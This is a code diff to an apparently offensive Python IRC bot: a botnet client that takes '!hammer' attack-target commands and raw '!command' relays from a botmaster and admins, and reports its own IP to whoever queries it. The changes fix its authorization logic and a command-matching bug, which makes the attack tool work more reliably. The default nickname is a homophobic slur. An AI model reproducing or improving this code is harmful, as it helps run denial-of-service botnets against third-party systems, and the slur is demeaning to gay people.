@@ -63,7 +63,7 @@ class hammer(threading.Thread):
 print(bcolors.OKBLUE + art + bcolors.ENDC)
 time.sleep(1)
 
-version = "0.1.3"
+version = "0.1.4"
 
 print(bcolors.HEADER + "~~ Built up on TorBot. Special thanks to Leet for this awesome code which is so easy to work with. <33333" + bcolors.ENDC)
 print(bcolors.OKBLUE + "v" + version + " see: https://github.com/ClaudiaDAnon/ClaudiaMIND" + bcolors.ENDC)
@@ -104,7 +104,7 @@ print(bcolors.OKBLUE + "IP: " + IP + bcolors.ENDC)
 
 # Setting nicknames and realnames
 
-nickname = "" # SET THIS VALUE TO YOUR NICKNAME
+nickname = config["nickname"] # SET THIS VALUE TO YOUR NICKNAME
 if nickname ==  "":
     nickname = "faggot" + str(int(random.random() * 1000))
 else:
@@ -213,9 +213,10 @@ while 1:
     if (senderuser == botmaster) or (senderuser == masterbot) or (senderuser in admins):
         auth = senderuser
         allowed = 1
-
-    if free_for_all == 1:
+    elif free_for_all == 1:
         allowed = 1
+    else:
+        allowed = 0
             
      
     # execute any commands detected from authorised people
@@ -225,6 +226,7 @@ while 1:
             time.sleep(1)
             message("Testing: v" + version)
             s.send("PRIVMSG " + senderuser + " :" + IP + " @" + version + "\r\n")
+            print(senderuser)
         if "!hammer" in sentmessage:
             if target is None:
                 attackdata = sentmessage.replace("!hammer ", "")
@@ -244,7 +246,7 @@ while 1:
             try:
                 commanddata = sentmessage.replace("!command ", "")
                 result = re.findall(r'(.*?) (.*)', commanddata)
-                if result[0][0] == nickname or "*":
+                if result[0][0] == nickname or result[0][0] == "*":
                     s.send(result[0][1] + "\r\n")
             except Exception as e:
                 print(bcolors.FAIL + "Incorrect !command format." + bcolors.ENDC)
